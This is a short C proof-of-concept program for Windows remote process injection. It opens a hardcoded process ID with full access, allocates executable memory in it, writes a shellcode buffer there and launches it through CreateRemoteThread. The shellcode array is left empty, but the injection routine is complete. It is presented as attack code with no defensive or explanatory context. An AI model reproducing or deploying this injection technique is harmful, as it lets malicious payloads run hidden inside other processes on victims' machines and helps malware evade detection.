// Remote Process Injection : POC

#include <stdio.h>
#include <windows.h>

int main()
{
    char shellcode[] = {};

    HANDLE hProcess; // Handle to store the remote process's handle
    HANDLE hThread;
    void* exec_mem;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 12368);
    exec_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, exec_mem, shellcode, sizeof(shellcode), NULL);
    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                 (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);

    CloseHandle(hProcess);
    return 0;
}
